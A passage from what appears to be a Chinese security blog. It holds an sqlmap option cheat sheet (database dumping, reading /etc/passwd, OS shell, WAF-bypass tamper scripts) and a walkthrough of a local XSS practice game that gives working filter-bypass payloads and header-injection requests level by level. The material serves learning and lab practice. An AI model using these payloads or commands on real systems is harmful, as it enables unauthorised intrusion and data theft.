指定目标：1234567891011121314151617181920GET方法： -d: 表示sqlmap将自己作为客户端去连接数据库 -u或者--url: 指定目标系统的URL， -p：对指定的参数进行SQL注入检测 -f: 检测数据库，服务器等（fingerprint）信息， -b或者--banner：获取数据库版本信息和数据库类型 --batch:不与使用者进行信息交互，直接执行 例：sqlmap.py -u &quot;http://www.xxx.com/?id=1&quot; -p id -f --batch -g：对Google的搜索结果进行SQL注入探测.例如：sqlmap.py -g &quot;inurl:\&quot;.php?id=1\.&quot; --force-ssl:强制使用SSL/HTTPS协议 例：sqlmap.py -u &quot;https://www.xxx.com/?id=1&quot; --force-sslPOST方法： -r: 将HTTP请求文件保存到文本文档中，使用参数-r读取文本文件的参数进行SQL注入.例：sqlmap.py -r request.txt -l: 将burpsuite log文件保存到文本文档中，使用参数-l读取文本文档的参数进行SQL注入。例：sqlmap.py -l log.txt -c:对配置文件进行SQL注入探测 枚举模块：123456789101112131415161718192021222324-a/--all:获取所有信息-b/--banner : 获取DBMS banner--dbs:枚举DBMS中所有的数据库–current-user:获取当前用户--privileges-U username(当前账号/CU) ：查看当前账号的权限--roles:列出数据库管理员角色，仅适用于当前数据库是Oracle–current-db : 获取当前数据库–users : 枚举DBMS用户–passwords : 枚举DBMS用户密码hash值–tables: 枚举DBMS数据库管理系统中的表--columns:枚举DBMS数据库管理系统中的列--schema:枚举DBMS数据库管理系统的模式--dump:转储DBMS数据库表项，后面加-C表示转储某列，-T转储某表，-D转储某数据库，--start,--stop,--first,--last指定开始结束，开头结尾。--dump-all：转储所有的DBMS数据库表项-D：指定枚举的DBMS中的数据库-T：指定要枚举的表-C：指定要枚举的列-D 数据库名 --tables:查找指定数据库中的表-D 数据库名 -T 表名 --columns：查找指定数据库的某个表中的列--exclude-sysdbs:忽略掉系统数据库--count:查找表中的记录数--schema:查找数据库的架构，包含所有的数据库，表和字段，以及各自的类型，一般与--exclude-sysdbs--batch：默认每次自动执行--sql-query/--sql/shell:运行自定义的SQL语句，例：--sql-query=&quot;select * from users;&quot;所得到的内容被保存到dump目录中 请求模块：123456789101112131415161718192021222324252627282930313233--data=DATA :指定post数据包中被传输的值 例：sqlmap.py -u &quot;http：//www.xxx.com&quot; --data=&quot;name=123&amp;pass=456&quot; -f--cookie=COOKIE:指定cookie值登录web程序，并且会尝试自动注入cookie值 需要在level 2或者大于level 2等级才会进行cookie注入。 如果cookie被服务器端更新，那么sqlmap也会自动更新cookie值。 例:sqlmap -u &quot;http://192.168.149.129/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie=&quot;security=low; PHPSESSID=d806c1f76f24a9687640ce497afc8f20&quot; --batch--param-del:告知sqlmap变量分隔符。web程序一般默认是&amp;符号作为分隔符，如果并非&amp;，则需要指定变量分隔符 例：sqlmap.py -u &quot;http://www.xxx.com&quot; --data=&quot;user=123;pass=456&quot; --param-del=&quot;;&quot; -f指定HTTP头部信息：-user-agent:指定UA头部信息。sqlmap默认使用UA为：sqlmap/1.0-dev-版本号 http://sqlmap.org--random-agent:使用sqlmap/txt/user-agents.txt字典中的UA头部进行随机替换--host=&quot;host header&quot; ：指定host头部信息，当level为5的时候才会检测host值--referer=&quot;REFERER&quot; ：指定Referer头部信息，当level大于等于三 ,才回去检测referer头部是否存在注入--method=GET/POST：指定使用get或者POST方式发送数据，默认以get方式发送延时： --delay=DELAY:每次HTTP（S）请求之间延迟时间，值为浮点数，单位为秒，默认无延迟--timeout=TIMEOUT ：设置超时时间，默认30秒--retries=RETRIES:设置重连次数，默认3次--randomize:设置随机改变的参数值--scope:利用正则表达式过滤日志内容--safe-url=SAFEURL ：指定需要去重复扫描的地址--safe-freq：指定每发送多少次的注入请求之后接着发正常请求 注：有些web应用程序会在攻击者多次访问错误的请求时屏蔽掉以后的所有请求，所以设置这两个参数防止以后无法进行注入 例：sqlmap.py -u &quot;https://www.xxx.com/?id=1&quot; --safe-url=“http://www.xxx.com” --safe-freq=3 --skip-urlencode:跳过URL编码的载荷 注：默认在get请求中是需要对传输数据进行编码，但是有些web服务器不遵守RPC标准编码，使用原始字符提交数据，所以使用这个参数使sqlmap不使用URL编码的参数进行测试--eval=EBALCODE：在请求之前执行提供的python代码。 例：sqlmap.py -u &quot;http://www.xxx.com/?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --evel=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot; 身份认证模块：123456789101112--auth-type=AUTH:指定HTTP认证类型（Basic, Digest, NTLM or PKI）--auth-cred=AUTH:指定HTTP认证证书（格式为：name:password） 例：sqlmap.py -u &quot;http://www.xxx.com/?id=1&quot; --auth-type=Basic --auth-cred &quot;user:pass&quot;--auth-file=AUTH:指定HTTP认证PEM格式的证书/私钥文件代理：--proxy=&quot;http://127.0.0.1:8081&quot; //将设置国外的代理服务器，传递给本地的8081端口，这个命令是将本地的8081端口反弹到国外的服务器上面去执行命令--proxy-cred=&quot;name:pass&quot; 例：sqlmap -u &quot;http://www.xxx.com/?id=1&quot; --proxy=&quot;http://127.0.0.1:8081&quot; --proxy-cred=&quot;user:pass&quot; -f--ignore-proxy：忽略系统级代理设置，通常用于扫描本地网络目标。 代理模块：12345--proxy=&quot;http://127.0.0.1:8081&quot; //将设置国外的代理服务器，传递给本地的8081端口，这个命令是将本地的8081端口反弹到国外的服务器上面去执行命令--proxy-cred=&quot;name:pass&quot; 例：sqlmap -u &quot;http://www.xxx.com/?id=1&quot; --proxy=&quot;http://127.0.0.1:8081&quot; --proxy-cred=&quot;user:pass&quot; -f--ignore-proxy：忽略系统级代理设置，通常用于扫描本地网络目标。 优化模块：12345-o 开启所有优化开关 --predict-output 预测常见的查询输出 --keep-alive 使用持久的HTTP（S）连接 --null-connection 从没有实际的HTTP响应体中检索页面长度 --threads=THREADS：设置最大的HTTP（S）请求并发量（默认为1） 注入模块：123456789101112131415-p:指定扫描的参数，也可以指定HTTP头部字段 例：sqlmap.py -u &quot;http://www.xxx.com/？id=1&quot; -p &quot;User-Agent,Referer，id&quot;--skip：跳过对某些参数进行测试。当使用--level的值很大但是有个别参数不想去测试的时候使用--skip去跳过 例：sqlmap.py -u &quot;http://www.xxx.com/？id=1&quot; --skip &quot;User-Agent,Referer，id&quot;-u:设置URL注入点。当有些网站将参数和值一起加入到URL链接中，sqlmap是默认不对其进行扫描的，所以我们需要去指定对某个参数值进行注入 例：sqlmap.py -u &quot;http://www.xxx.com/param1/value1*/param2/value2*&quot; --dbms:设置目标服务器所使用的DBMS 例：--dbms=&quot;mysql&quot;--os:指定目标的操作系统 例：--os=&quot;linux&quot;--invalid-bignum:给参数值给与最大值让其失效--invalid-logical：使用布尔判断使取值失效--no-cast:榨取数据时，sqlmap将所有的结果转换成字符串，并用空格替换null值（老版本mysql数据库需要开启此开关）--tamper=TAMPER：使用给定的脚本去混淆绕过应用层的过滤，比如waf/ids等。该文件存放在/sqlmap/tamper文件下例：sqlmap.py -u &quot;www.xxx.com/?id=1&quot; -p &quot;id&quot; --tamper=&quot;between.py,overlongutf8more.py,lowercase.py &quot; 检测模块：123456--level :共有5级，默认等级1，可以自己制定，推荐等级3--risk:共有4级，默认等级1，risk升高可造成数据被篡改等风险--string:指定页面返回某个字符串则为真--not-string:指定页面不返回某个字符串则为真--Regexp:当查询的值为真时，使用正则表达式去匹配--code：当查询的值为真时，执行HTTP code 技术类型：12345678sqlmap默认使用这些操作--technique=TECH 指定sqlmap使用的检测技术，默认情况下会测试所有的方式。 --time-sec=TIMESEC 设置延迟时间，基于时间的注入检测默认延迟时间是5秒 --union-cols=UCOLS 联合查询时默认是1-10列，当level=5时会增加到测试50个字段数，可以使用此参数设置查询的字段数。 --union-char=UCHAR 默认情况下sqlmap针对UNION查询的注入会使用NULL字符； --union-from=UFROM 在UNION查询SQL注入的FROM部分中使用的表 --dns-domain=DNS.. 攻击者控制了某DNS服务器，使用此功能可以提高数据查询的速度 --second-order=S.. 使用此参数指定到哪个页面获取响应判断真假，--second-order后面跟一个判断页面的URL地址。 指纹信息：12-f/--fingerprint:查询目标系统的数据库管理系统的指纹信息-b/--banner:返回数据库的版本信息 爆破模块：12345678用于： mysql版本&lt;5.0的时候，没有information_schema库 mysql版本&gt;=5.0，但无权读取information_schema库 微软的access数据库，默认无权读取MSysObjects库。 --common-tables:爆破表名 例：sqlmap.py -u &quot;http://www.baidu.com/?id=1&quot; --common-tables --common-columns:暴力破解列名 UDF注入模块：1234UDF：自定义函数，利用UDF函数达到执行操作系统命令--udf-inject:注入用户自定义函数--shared-lib=SHLIB:指定共享库的本地路径这两条命令一起使用 系统文件操作：123--file-read=RFILE:从后端DBMS文件系统中读取文件（读取系统文件） 例：--file-read=&quot;/etc/passwd&quot;--file-write=SHELL.PHP --file-dest=DFILE：把当前系统的文件写入到目标服务器的某个目录下去 OS系统访问：123--os-cmd:运行任意操作系统命令（适用于数据库为mysql，postgresql，或Sql Server，并且当前用户有权限使用特定的函数） 例：--os-cmd id :执行id命令，后期是与sqlmap进行交互，生成UDF函数在操作系统下执行命令--os-shell:获取一个shell（目标系统为管理员权限，并且得知绝对路径） Windows注册表模块：1234--reg-read:读取注册表的值--reg-add:写入注册表值--reg-del:删除注册表值--reg-key,--reg-value,--reg-data,--reg-type:注册表辅助选项 一般性参数：123456789101112-s:指定sqlite会话文件保存位置-t:记录流量文件保存位置--charset:强制字符编码 例：--charset=GBK--crawl:从开始位置爬站深度 例：--crawl=3--csv-del:dump下来的数据以CVS格式保存--dbms-creb:指定数据库账号--slush-session:清空session--fresh-queries：忽略session查询结果--hex：当dump下非ASCii字符内容时，将其编码成16进账形式，收到后解析还原--save:将命令保存成配置文件 批处理模块：123--check-waf:检测WAF/IPS/IDS--hpp:绕过WAF/IPS/ISD，尤其是对ASP/IIS和ASP.NET/IIS有效--identify-waf:彻底的WAF/IPS/IDS检测，支持三十多种产品 杂项模块：1234--mobile：模拟智能手机设备，修改User-Agent为手机端的UA--purge-output:清空output文件夹--smart：当有大量检测目标时，只修改基于错误的检测结果--wizard:设置用户向导参数，教你一步步针对目标注入]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS小游戏]]></title>
    <url>%2F2019%2F02%2F25%2Fxss%E5%B0%8F%E6%B8%B8%E6%88%8F%2F</url>
    <content type="text"><![CDATA[生命中遇到最美的景致，并不需要浓墨重彩去描绘，而是平常心踩出的一串淡淡的足迹。 今天在网上找到了一个XSS小游戏，觉得蛮好玩的，刚好自己对XSS理解不深，拿来学习正好！ 这个XSS程序直接放到phpstudy中，访问即可 那么就开始我们的探索旅程吧！ Level 1：根据URL和网页源代码可以看出test变量是可控的 1http://127.0.0.1/xss/level1.php?name=test 1234567&lt;script&gt;window.alert = function() &#123; confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level2.php?keyword=test&quot;; &#125;&lt;/script&gt; 那么可以构造payload，将test替换成payload即可,为： 1&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt; 我原先以为需要闭合前面的双引号才可以执行payload进行弹窗，但是不闭合也是可以弹窗的： 1&lt;script&gt;alert(/xss/)&lt;/script&gt; Level 2:先把第一关的payload拿来试试，看看被过滤了哪些参数 123456789101112&lt;title&gt;欢迎来到level2&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(xss)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&lt;script&gt;alert(xss)&lt;/script&gt;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;&lt;h3 align=center&gt;payload的长度:27&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; 发现是把URL中的keyword参数的值进行了编码，这是使用了一个过滤函数htmlspecialchars()将预定义的字符转换成HTML实体，但是并未对input标签内的test值进行编码，那么我们可以对这个标签构造闭合，payload为： 1&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; Level 3:这次我们在搜索框输入xss，首先判断服务器将我们输入的内容放在代码的哪个位置，然后尝试闭合绕过 123456789101112&lt;title&gt;欢迎来到level3&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;&lt;h2 align=center&gt;没有找到和xss相关的结果.&lt;/h2&gt;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;xss&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;&lt;h3 align=center&gt;payload的长度:3&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; 可以看到有两处我们所搜索的xss字符串 而且发现URL也改变啦 1http://127.0.0.1/xss/level3.php?keyword=xss&amp;submit=%E6%90%9C%E7%B4%A2 试了好几个payload都没有成功，然后没办法，开始看代码 发现有一段PHP代码 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt; 其中涉及到htmlspecialchars() 函数 在网上查了查这个函数，他是把预定义的字符转换为 HTML 实体。 1234567Character HTML Entity Notes&amp; &amp;amp; &quot; &amp;quot; Depending on how [quote_style] is set&apos; &amp;#039 Depending on how [quote_style] is set&gt; &amp;gt; &lt; &amp;lt; 但是htmlspecialchars（）函数默认的配置不过滤单引号的。只有设置了:quotestyle选项为ENT_QUOTES才会过滤掉单引号。 我们来试一试用事件来弹框： onmouseover 事件会在鼠标指针移动到指定的对象上时发生 1&apos;onmouseover=alert(1) x=&apos; onclick 事件会在对象被点击时发生。 1&apos;onclick=&apos;window.alert() 还有其他事件也是可以实现的，我这里就演示两个！ Level 4:之后都是查看网站源码，旨在学习xss！ 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0); //关闭输出程序错误信息$str = $_GET[&quot;keyword&quot;]; //通过GET方式获取keyword变量的值$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); //将获取到的变量值中的&gt;替换成空，并传递给变量str2$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2); //将获取到的str2的值中的&lt;替换成空，并传递给str3echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt; //设置输出框，将str3的值输出到框内&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 因为所获取到的str3的值只是过滤掉&lt;&gt;这两个符号，我们将Level 3的payload进行修改成为： 当鼠标移动到这个字符串的时候弹窗 1&quot;onmouseover=&quot;alert(1) 当鼠标点击输入框的时候弹窗 1&quot;onclick=&apos;window.alert() Level 5：123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str); //将传入的参数值中的&lt;script&gt;替换成&lt;scr_ipt$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); //将str2中的on字符串替换成o_necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 这里我们将无法使用JavaScript事件来进行弹窗。在这里附上JavaScript事件的事件表，以供学习参考 属性 当以下情况发生时，出现此事件 FF N IE onabort 图像加载被中断 1 3 4 onblur 元素失去焦点 1 2 3 onchange 用户改变域的内容 1 2 3 onclick 鼠标点击某个对象 1 2 3 ondblclick 鼠标双击某个对象 1 4 4 onerror 当加载文档或图像时发生某个错误 1 3 4 onfocus 元素获得焦点 1 2 3 onkeydown 某个键盘的键被按下 1 4 3 onkeypress 某个键盘的键被按下或按住 1 4 3 onkeyup 某个键盘的键被松开 1 4 3 onload 某个页面或图像被完成加载 1 2 3 onmousedown 某个鼠标按键被按下 1 4 4 onmousemove 鼠标被移动 1 6 3 onmouseout 鼠标从某元素移开 1 4 4 onmouseover 鼠标被移到某元素之上 1 2 3 onmouseup 某个鼠标按键被松开 1 4 4 onreset 重置按钮被点击 1 3 4 onresize 窗口或框架被调整尺寸 1 4 4 onselect 文本被选定 1 2 3 onsubmit 提交按钮被点击 1 2 3 onunload 用户退出页面 1 2 3 但是这串代码没有过滤&lt;字符和&gt;字符，那么我们可以使用标签的href属性构造payload进行弹窗 1&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt; 或者使用 1&quot;&gt;&lt;a href=&quot;javascript:onclick=alert()&quot;&gt;xss&lt;/a&gt; 点击xss按钮即可弹窗，但是我不是很明白第二个payload，因为前面的PHP代码已经将on替换成0_n那么onclick不就变成了o_nclick，那么这个如何弹窗呢？我表示很困惑。。。。。后来发现网站并未将onclick中的on替换成o_n，所以便可以弹框。 Level 6：123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; emmmmm，看着这个代码过滤了很多的字符串，但是并没有进行大小写判定,很是好玩 1&quot;&gt;&lt;ScRipT&gt;alert(/xss/)&lt;/ScrIpt&gt; 1&quot;ONclick=&quot;window.alert() 1&quot;&gt;&lt;a HrEf=&quot;javascript:onclick=alert()&quot;&gt;xss&lt;/a&gt; Level 7：123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看源码，发现了网站对传入的参数进行了小写转换，并且将一些特殊值替换成空，那么我们可以将其进行双写绕过 1&quot;&gt;&lt;Scrscriptipt&gt;alert(/xss/)&lt;/scriScriptpt&gt; 1&quot;OonNclick=&quot;window.alert() 1&quot;&gt;&lt;a hrhrefef=javascriscriptpt:onclick=alert()&gt;xss&lt;/a&gt; 1&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert()&gt;xss&lt;/a&gt; Level 8：1234567891011121314151617181920212223&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str); //将script替换成scr_ipt$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); //将on替换成o_n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3); $str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6); //将双引号替换成&amp;quotecho &apos;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt; //将所获取到的字符串进行HTML编码&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?php echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; //通过href属性将￥str7变量输出到页面?&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt; 后台做了三个措施：将特殊字符替换/将获取到的字符串进行HTML编码/通过href属性将处理后得值输出 网上的教程是将伪协议JavaScript：alert（1）中的script的一个字符进行HTML编码绕过防护 1javascri&amp;#x70;t:alert() 或者 1javascri&amp;#112;t:alert() Level 9:123456789101112131415161718192021222324252627282930&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?phpif(false===strpos($str7,&apos;http://&apos;)) //如果str7中没有http：//&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; //则报错 &#125;else&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; &#125;?&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt; 那么我们可以构造payload： 1javascri&amp;#x0070;t:alert(1)/*http://www.baidu.com*/ 只要让程序检测到http://但不让这个生效即可，可以采用注释的方法构造payload。 Level 10：1234567891011121314&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 分析代码，发现需要两个参数，一个是keyword，一个是t_sort，尖括号&lt;&gt;都被转换成空，还有三个hidden的隐藏输入框， 或许我们可以从隐藏的输入框下手 构造payload为： 1keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onclick = &quot;alert(1) 1keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=&quot;alert(1) 1keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=alert`1` Level 11：查看后台代码 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_REFERER&apos;]; //获取HTTP的REFERER头部信息$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11); //将所获取到的referer中的&gt;替换为空$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22); //将变量$str22中的&lt;替换成空echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt; //在这里进行注入&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，发现可以对referer头部注入 我们burp抓包，添加Referer头部，插入payload 123456789GET /xss/level11.php?keyword=good%20job! HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: closeReferer: &quot;onclick=alert(1) type=&quot;text&quot; //所添加的Referer头部 forward转发，关掉代理，点击页面的框即可弹窗成功！ Level 12：第12关和第11关蛮相似的，12关是对UA头部进行xss注入 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; payload为： 123456789GET /xss/level12.php?keyword=good%20job! HTTP/1.1Host: 127.0.0.1User-Agent: &quot; onmouseover=alert(1) type=&quot;text&quot; //修改User-Agent值Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Cookie: user=call+me+maybe%3FConnection: close Level 13：1234567891011121314151617&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600); //setcookie函数用于向客户端发送一个cookie值ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;]; //使用$_COOKIE变量来取回cookie中user的值$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt; //再此进行注入&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，发现是xss进行的cookie注入，那么抓包修改cookie即可 123456789GET /xss/level13.php?keyword=good%20job! HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; 